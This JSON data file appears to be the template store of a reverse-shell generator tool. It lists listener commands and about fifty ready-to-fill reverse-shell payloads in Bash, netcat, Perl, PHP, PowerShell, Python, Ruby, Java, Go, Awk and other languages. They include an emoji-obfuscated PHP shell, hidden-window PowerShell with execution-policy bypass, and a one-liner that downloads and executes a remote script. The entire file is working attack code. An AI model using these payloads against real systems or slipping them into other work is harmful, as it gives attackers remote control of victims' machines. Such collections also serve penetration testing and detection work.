{
  "ReverseShells":{	
	  	"TargetShells":[
			{
				"name":"sh"
			},
			{
				"name":"/bin/sh"
			},
			{
				"name":"bash"
			},
			{
				"name":"/bin/bash"
			},
			{
				"name":"cmd"
			},
			{
				"name":"powershell"
			},
			{
				"name":"pwsh"
			},
			{
				"name":"ash"
			},
			{
				"name":"bsh"
			},
			{
				"name":"csh"
			},
			{
				"name":"ksh"
			},
			{
				"name":"zsh"
			},
			{
				"name":"pdksh"
			},
			{
				"name":"tcsh"
			}
		],
	  	"Listeners":[
			{
				"name": "nc",
				"command": "nc -lvnp ${port}"
			},
			{
				"name": "ncat",
				"command": "ncat -lvnp ${port}"
			},
			{
				"name": "ncat (TLS)",
				"command":"ncat --ssl -lvnp ${port}"
			},
			{
				"name": "rlwrap + nc",
				"command":"rlwrap -cAr nc -lvnp ${port}"
			},
			{
				"name": "rustcat",
				"command":"rcat -lp ${port}"
			},
			{
				"name": "rustcat + Command History",
				"command":"rcat -lHp ${port}"
			},
			{
				"name": "pwncat",
				"command":"python3 -m pwncat -lp ${port}"
			},
			{
				"name": "windows ConPty",
				"command":"stty raw -echo; (stty size; cat) | nc -lvnp ${port}"
			},
			{
				"name": "socat",
				"command":"socat -d -d TCP-LISTEN:${port} STDOUT"
			},
			{
				"name": "socat (TTY)",
				"command":"socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:${port}"
			},
			{
				"name": "msfconsole",
				"command":"msfconsole -q -x \"use multi/handler; set payload {payload}; set lhost {ip}; set lport {port}; exploit\""
			}
		],
		"Shells":[
		{
            "name": "Bash -i",
            "command": "${shell} -i >& /dev/tcp/${ip}/${port} 0>&1",
            "meta": ["linux", "mac"]
		},
		{
            "name": "Bash 196",
            "command": "0<&196;exec 196<>/dev/tcp/${ip}/${port}; ${shell} <&196 >&196 2>&196",
            "meta": ["linux", "mac"]
		},
        {
            "name": "Bash read line",
            "command": "exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do $line 2>&5 >&5; done",
            "meta": ["linux", "mac"]
        },
        {
            "name": "Bash 5",
            "command": "${shell} -i 5<> /dev/tcp/${ip}/${port} 0<&5 1>&5 2>&5",
            "meta": ["linux", "mac"]
        },
        {
            "name": "Bash udp",
            "command": "${shell} -i >& /dev/udp/${ip}/${port} 0>&1",
            "meta": ["linux", "mac"]
        },
        {
            "name": "nc mkfifo",
            "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${ip} ${port} >/tmp/f",
            "meta": ["linux", "mac"]
        },
        {
            "name": "nc -e",
            "command": "nc -e ${shell} ${ip} ${port}",
            "meta": ["linux", "mac"]
        },
        {
            "name": "nc.exe -e",
            "command": "nc.exe -e ${shell} ${ip} ${port}",
            "meta": ["windows"]
        },
        {
            "name": "nc -c",
            "command": "nc -c ${shell} ${ip} ${port}",
            "meta": ["linux", "mac"]
        },
        {
            "name": "ncat -e",
            "command": "ncat ${ip} ${port} -e ${shell}",
            "meta": ["linux", "mac"]
        },
        {
            "name": "ncat.exe -e",
            "command": "ncat.exe ${ip} ${port} -e ${shell}",
            "meta": ["windows"]
        },
        {
            "name": "ncat udp",
            "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|ncat -u ${ip} ${port} >/tmp/f",
            "meta": ["linux", "mac"]
        },
        {
            "name": "rustcat",
            "command": "rcat ${ip} ${port} -r ${shell}",
            "meta": ["linux", "mac"]
        },
        {
            "name": "C",
            "command": "#include <stdio.h>\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n\nint main(void){\n    int port = ${port};\n    struct sockaddr_in revsockaddr;\n\n    int sockt = socket(AF_INET, SOCK_STREAM, 0);\n    revsockaddr.sin_family = AF_INET;       \n    revsockaddr.sin_port = htons(port);\n    revsockaddr.sin_addr.s_addr = inet_addr(\"${ip}\");\n\n    connect(sockt, (struct sockaddr *) &revsockaddr, \n    sizeof(revsockaddr));\n    dup2(sockt, 0);\n    dup2(sockt, 1);\n    dup2(sockt, 2);\n\n    char * const argv[] = {\"${shell}\", NULL};\n    execve(\"${shell}\", argv, NULL);\n\n    return 0;       \n}",
            "meta": ["linux", "mac"]
        },
                {
            "name": "C Windows",
            "command": "#include <winsock2.h>\r\n#include <stdio.h>\r\n#pragma comment(lib,\"ws2_32\")\r\n\r\nWSADATA wsaData;\r\nSOCKET Winsock;\r\nstruct sockaddr_in hax; \r\nchar ip_addr[16] = \"${ip}\"; \r\nchar port[6] = \"${port}\";            \r\n\r\nSTARTUPINFO ini_processo;\r\n\r\nPROCESS_INFORMATION processo_info;\r\n\r\nint main()\r\n{\r\n    WSAStartup(MAKEWORD(2, 2), &wsaData);\r\n    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);\r\n\r\n\r\n    struct hostent *host; \r\n    host = gethostbyname(ip_addr);\r\n    strcpy_s(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));\r\n\r\n    hax.sin_family = AF_INET;\r\n    hax.sin_port = htons(atoi(port));\r\n    hax.sin_addr.s_addr = inet_addr(ip_addr);\r\n\r\n    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);\r\n\r\n    memset(&ini_processo, 0, sizeof(ini_processo));\r\n    ini_processo.cb = sizeof(ini_processo);\r\n    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; \r\n    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;\r\n\r\n    TCHAR cmd[255] = TEXT(\"cmd.exe\");\r\n\r\n    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);\r\n\r\n    return 0;\r\n}",
            "meta": ["windows"]
        },
        {
            "name": "C#",
            "command": "using System;\nusing System.Text;\nusing System.IO;\nusing System.Diagnostics;\nusing System.ComponentModel;\nusing System.Linq;\nusing System.Net;\nusing System.Net.Sockets;\n\n\nnamespace ConnectBack\n{\n\tpublic class Program\n\t{\n\t\tstatic StreamWriter streamWriter;\n\n\t\tpublic static void Main(string[] args)\n\t\t{\n\t\t\tusing(TcpClient client = new TcpClient(\"${ip}\", ${port}))\n\t\t\t{\n\t\t\t\tusing(Stream stream = client.GetStream())\n\t\t\t\t{\n\t\t\t\t\tusing(StreamReader rdr = new StreamReader(stream))\n\t\t\t\t\t{\n\t\t\t\t\t\tstreamWriter = new StreamWriter(stream);\n\t\t\t\t\t\t\n\t\t\t\t\t\tStringBuilder strInput = new StringBuilder();\n\n\t\t\t\t\t\tProcess p = new Process();\n\t\t\t\t\t\tp.StartInfo.FileName = \"cmd.exe\";\n\t\t\t\t\t\tp.StartInfo.CreateNoWindow = true;\n\t\t\t\t\t\tp.StartInfo.UseShellExecute = false;\n\t\t\t\t\t\tp.StartInfo.RedirectStandardOutput = true;\n\t\t\t\t\t\tp.StartInfo.RedirectStandardInput = true;\n\t\t\t\t\t\tp.StartInfo.RedirectStandardError = true;\n\t\t\t\t\t\tp.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);\n\t\t\t\t\t\tp.Start();\n\t\t\t\t\t\tp.BeginOutputReadLine();\n\n\t\t\t\t\t\twhile(true)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tstrInput.Append(rdr.ReadLine());\n\t\t\t\t\t\t\t//strInput.Append(\"\\n\");\n\t\t\t\t\t\t\tp.StandardInput.WriteLine(strInput);\n\t\t\t\t\t\t\tstrInput.Remove(0, strInput.Length);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tprivate static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)\n        {\n            StringBuilder strOutput = new StringBuilder();\n\n            if (!String.IsNullOrEmpty(outLine.Data))\n            {\n                try\n                {\n                    strOutput.Append(outLine.Data);\n                    streamWriter.WriteLine(strOutput);\n                    streamWriter.Flush();\n                }\n                catch (Exception err) { }\n            }\n        }\n\n\t}\n}",
            "meta": ["linux", "windows"]
        },
        {
            "name": "Haskell #1",
            "command": "module Main where\n\nimport System.Process\n\nmain = callCommand \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | ${shell} -i 2>&1 | nc ${ip} ${port} >/tmp/f\"",
            "meta": ["linux", "mac"]
        },
        {
            "name": "Perl",
            "command": "perl -e 'use Socket;$i=\"${ip}\";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"${shell} -i\");};'",
            "meta": ["linux", "mac"]
        },
        {
            "name": "Perl no sh",
            "command": "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"${ip}:${port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
            "meta": ["linux", "mac"]
        },
        {
            "name": "PHP Emoji",
            "command": "php -r '$ğŸ˜€=\"1\";$ğŸ˜=\"2\";$ğŸ˜…=\"3\";$ğŸ˜†=\"4\";$ğŸ˜‰=\"5\";$ğŸ˜Š=\"6\";$ğŸ˜=\"7\";$ğŸ˜=\"8\";$ğŸ˜š=\"9\";$ğŸ™‚=\"0\";$ğŸ¤¢=\" \";$ğŸ¤“=\"<\";$ğŸ¤ =\">\";$ğŸ˜±=\"-\";$ğŸ˜µ=\"&\";$ğŸ¤©=\"i\";$ğŸ¤”=\".\";$ğŸ¤¨=\"/\";$ğŸ¥°=\"a\";$ğŸ˜=\"b\";$ğŸ˜¶=\"i\";$ğŸ™„=\"h\";$ğŸ˜‚=\"c\";$ğŸ¤£=\"d\";$ğŸ˜ƒ=\"e\";$ğŸ˜„=\"f\";$ğŸ˜‹=\"k\";$ğŸ˜˜=\"n\";$ğŸ˜—=\"o\";$ğŸ˜™=\"p\";$ğŸ¤—=\"s\";$ğŸ˜‘=\"x\";$ğŸ’€ = $ğŸ˜„. $ğŸ¤—. $ğŸ˜—. $ğŸ˜‚. $ğŸ˜‹. $ğŸ˜—. $ğŸ˜™. $ğŸ˜ƒ. $ğŸ˜˜;$ğŸš€ = \"${ip}\";$ğŸ’» = ${port};$ğŸš = \"${shell}\". $ğŸ¤¢. $ğŸ˜±. $ğŸ¤©. $ğŸ¤¢. $ğŸ¤“. $ğŸ˜µ. $ğŸ˜…. $ğŸ¤¢. $ğŸ¤ . $ğŸ˜µ. $ğŸ˜…. $ğŸ¤¢. $ğŸ˜. $ğŸ¤ . $ğŸ˜µ. $ğŸ˜…;$ğŸ¤£ =  $ğŸ’€($ğŸš€,$ğŸ’»);$ğŸ‘½ = $ğŸ˜ƒ. $ğŸ˜‘. $ğŸ˜ƒ. $ğŸ˜‚;$ğŸ‘½($ğŸš);'",
            "meta": ["linux", "mac"]
        },
        {
            "name": "PHP PentestMonkey",
            "command": "<?php\n// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php\n// Copyright (C) 2007 pentestmonkey@pentestmonkey.net\n\nset_time_limit (0);\n$VERSION = \"1.0\";\n$ip = '${ip}';\n$port = ${port};\n$chunk_size = 1400;\n$write_a = null;\n$error_a = null;\n$shell = 'uname -a; w; id; ${shell} -i';\n$daemon = 0;\n$debug = 0;\n\nif (function_exists('pcntl_fork')) {\n\t$pid = pcntl_fork();\n\t\n\tif ($pid == -1) {\n\t\tprintit(\"ERROR: Can't fork\");\n\t\texit(1);\n\t}\n\t\n\tif ($pid) {\n\t\texit(0);  // Parent exits\n\t}\n\tif (posix_setsid() == -1) {\n\t\tprintit(\"Error: Can't setsid()\");\n\t\texit(1);\n\t}\n\n\t$daemon = 1;\n} else {\n\tprintit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");\n}\n\nchdir(\"/\");\n\numask(0);\n\n// Open reverse connection\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\nif (!$sock) {\n\tprintit(\"$errstr ($errno)\");\n\texit(1);\n}\n\n$descriptorspec = array(\n   0 => array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from\n   1 => array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to\n   2 => array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to\n);\n\n$process = proc_open($shell, $descriptorspec, $pipes);\n\nif (!is_resource($process)) {\n\tprintit(\"ERROR: Can't spawn shell\");\n\texit(1);\n}\n\nstream_set_blocking($pipes[0], 0);\nstream_set_blocking($pipes[1], 0);\nstream_set_blocking($pipes[2], 0);\nstream_set_blocking($sock, 0);\n\nprintit(\"Successfully opened reverse shell to $ip:$port\");\n\nwhile (1) {\n\tif (feof($sock)) {\n\t\tprintit(\"ERROR: Shell connection terminated\");\n\t\tbreak;\n\t}\n\n\tif (feof($pipes[1])) {\n\t\tprintit(\"ERROR: Shell process terminated\");\n\t\tbreak;\n\t}\n\n\t$read_a = array($sock, $pipes[1], $pipes[2]);\n\t$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n\n\tif (in_array($sock, $read_a)) {\n\t\tif ($debug) printit(\"SOCK READ\");\n\t\t$input = fread($sock, $chunk_size);\n\t\tif ($debug) printit(\"SOCK: $input\");\n\t\tfwrite($pipes[0], $input);\n\t}\n\n\tif (in_array($pipes[1], $read_a)) {\n\t\tif ($debug) printit(\"STDOUT READ\");\n\t\t$input = fread($pipes[1], $chunk_size);\n\t\tif ($debug) printit(\"STDOUT: $input\");\n\t\tfwrite($sock, $input);\n\t}\n\n\tif (in_array($pipes[2], $read_a)) {\n\t\tif ($debug) printit(\"STDERR READ\");\n\t\t$input = fread($pipes[2], $chunk_size);\n\t\tif ($debug) printit(\"STDERR: $input\");\n\t\tfwrite($sock, $input);\n\t}\n}\n\nfclose($sock);\nfclose($pipes[0]);\nfclose($pipes[1]);\nfclose($pipes[2]);\nproc_close($process);\n\nfunction printit ($string) {\n\tif (!$daemon) {\n\t\tprint \"$string\\n\";\n\t}\n}\n\n?>",
            "meta": ["linux", "windows", "mac"]
        },
        {
            "name": "PHP exec",
            "command": "php -r '$sock=fsockopen(\"${ip}\",${port});exec(\"${shell} <&3 >&3 2>&3\");'",
            "meta": ["linux", "mac"]
        },
        {
            "name": "PHP shell_exec",
            "command": "php -r '$sock=fsockopen(\"${ip}\",${port});shell_exec(\"${shell} <&3 >&3 2>&3\");'",
            "meta": ["linux", "mac"]
        },
        {
            "name": "PHP system",
            "command": "php -r '$sock=fsockopen(\"${ip}\",${port});system(\"${shell} <&3 >&3 2>&3\");'",
            "meta": ["linux", "windows", "mac"]
        },
        {
            "name": "PHP passthru",
            "command": "php -r '$sock=fsockopen(\"${ip}\",${port});passthru(\"${shell} <&3 >&3 2>&3\");'",
            "meta": ["linux", "mac"]
        },
        {
            "name": "PHP `",
            "command": "php -r '$sock=fsockopen(\"${ip}\",${port});`${shell} <&3 >&3 2>&3`;'",
            "meta": ["linux", "windows", "mac"]
        },
        {
            "name": "PHP popen",
            "command": "php -r '$sock=fsockopen(\"${ip}\",${port});popen(\"${shell} <&3 >&3 2>&3\", \"r\");'",
            "meta": ["linux", "windows", "mac"]
        },
        {
            "name": "PHP proc_open",
            "command": "php -r '$sock=fsockopen(\"${ip}\",${port});$proc=proc_open(\"${shell}\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'",
            "meta": ["linux", "windows", "mac"]
        },
        {
            "name": "Windows ConPty",
            "command": "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell ${ip} ${port}",
            "meta": ["windows"]
        },
        {
            "name": "PowerShell #1",
            "command": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"${ip}\",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
            "meta": ["windows"]
        },
        {
            "name": "PowerShell #2",
            "command": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
            "meta": ["windows"]
        },
        {
            "name": "PowerShell #3",
            "command": "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('${ip}', ${port});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()\"",
            "meta": ["windows"]
        },
        {
            "name": "PowerShell #4 (TLS)",
            "command": "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('${ip}', ${port});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()\"",
            "meta": ["windows"]
        },
        {
            "name": "PowerShell #3 (Base64)",
            "meta": ["windows"]
        },
        {
            "name": "Python #1",
            "command": "export RHOST=\"${ip}\";export RPORT=${port};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"${shell}\")'",
            "meta": ["linux", "mac"]
        },
        {
            "name": "Python #2",
            "command": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${ip}\",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"${shell}\")'",
            "meta": ["linux", "mac"]
        },
        {
            "name": "Python3 #1",
            "command": "export RHOST=\"${ip}\";export RPORT=${port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"${shell}\")'",
            "meta": ["linux", "mac"]
        },
        {
            "name": "Python3 #2",
            "command": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${ip}\",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"${shell}\")'",
            "meta": ["linux", "mac"]
        },
        {
            "name": "Python3 shortest",
            "command": "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"${ip}\",${port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"${shell}\")'",
            "meta": ["linux"]
        },
        {
            "name": "Ruby #1",
            "command": "ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"${ip}\",${port}))'",
            "meta": ["linux", "mac"]
        },
        {
            "name": "Ruby no sh",
            "command": "ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"${ip}\",\"${port}\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}'",
            "meta": ["linux", "mac"]
        },
        {
            "name": "socat #1",
            "command": "socat TCP:${ip}:${port} EXEC:${shell}",
            "meta": ["linux", "mac"]
        },
        {
            "name": "socat #2 (TTY)",
            "command": "socat TCP:${ip}:${port} EXEC:'${shell}',pty,stderr,setsid,sigint,sane",
            "meta": ["linux", "mac"]
        },
        {
            "name": "node.js",
            "command": "require('child_process').exec('nc -e ${shell} ${ip} ${port}')",
            "meta": ["linux", "mac"]
        },
	    {
            "name": "Java #1",
            "command": "public class shell {\n    public static void main(String[] args) {\n        Process p;\n        try {\n            p = Runtime.getRuntime().exec(\"bash -c $@|bash 0 echo bash -i >& /dev/tcp/${ip}/${port} 0>&1\");\n            p.waitFor();\n            p.destroy();\n        } catch (Exception e) {}\n    }\n}",
            "meta": ["linux", "mac"]
        },
        {
            "name": "Java #2",
            "command": "public class shell {\n    public static void main(String[] args) {\n        ProcessBuilder pb = new ProcessBuilder(\"bash\", \"-c\", \"$@| bash -i >& /dev/tcp/${ip}/${port} 0>&1\")\n            .redirectErrorStream(true);\n        try {\n            Process p = pb.start();\n            p.waitFor();\n            p.destroy();\n        } catch (Exception e) {}\n    }\n}",
            "meta": ["linux", "mac"]
        },
        {
            "name": "Java #3",
            "command": "import java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class shell {\n    public static void main(String[] args) {\n        String host = \"${ip}\";\n        int port = ${port};\n        String cmd = \"${shell}\";\n        try {\n            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();\n            Socket s = new Socket(host, port);\n            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();\n            OutputStream po = p.getOutputStream(), so = s.getOutputStream();\n            while (!s.isClosed()) {\n                while (pi.available() > 0)\n                    so.write(pi.read());\n                while (pe.available() > 0)\n                    so.write(pe.read());\n                while (si.available() > 0)\n                    po.write(si.read());\n                so.flush();\n                po.flush();\n                Thread.sleep(50);\n                try {\n                    p.exitValue();\n                    break;\n                } catch (Exception e) {}\n            }\n            p.destroy();\n            s.close();\n        } catch (Exception e) {}\n    }\n}",
            "meta": ["windows", "linux", "mac"]
        },
		{
		   "name": "Groovy",
		   "command":"String host=\"${ip}\";int port=${port};String cmd=\"${shell}\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();",
		   "meta":["windows"]
		},
		{
            "name": "telnet",
            "command": "TF=$(mktemp -u);mkfifo $TF && telnet ${ip} ${port} 0<$TF | ${shell} 1>$TF",
            "meta": ["linux", "mac"]
        },
        {
            "name": "zsh",
            "command": "zsh -c 'zmodload zsh/net/tcp && ztcp ${ip} ${port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",
            "meta": ["linux", "mac"]
        },
        {
            "name": "Lua #1",
            "command": "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('${ip}','${port}');os.execute('${shell} -i <&3 >&3 2>&3');\"",
            "meta": ["linux"]
        },
        {
            "name": "Lua #2",
            "command": "lua5.1 -e 'local host, port = \"${ip}\", ${port} local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'",
            "meta": ["linux", "windows"]
        },
        {
            "name": "Golang",
            "command": "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"${ip}:${port}\");cmd:=exec.Command(\"${shell}\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go",
            "meta": ["linux", "mac", "windows"]
        },
		{
            "name": "Vlang",
            "command": "echo 'import os' > /tmp/t.v && echo 'fn main() { os.system(\"nc -e ${shell} ${ip} ${port} 0>&1\") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v",
            "meta": ["linux", "mac"]
        },
        {
            "name": "Awk",
            "command": "awk 'BEGIN {s = \"/inet/tcp/0/${ip}/${port}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null",
            "meta": ["linux", "mac"]
        },
        {
            "name": "Dart",
            "command": "import 'dart:io';\nimport 'dart:convert';\n\nmain() {\n  Socket.connect(\"${ip}\", ${port}).then((socket) {\n    socket.listen((data) {\n      Process.start('${shell}', []).then((Process process) {\n        process.stdin.writeln(new String.fromCharCodes(data).trim());\n        process.stdout\n          .transform(utf8.decoder)\n          .listen((output) { socket.write(output); });\n      });\n    },\n    onDone: () {\n      socket.destroy();\n    });\n  });\n}",
            "meta": ["linux", "mac", "windows"]
        }
      ]
  }
}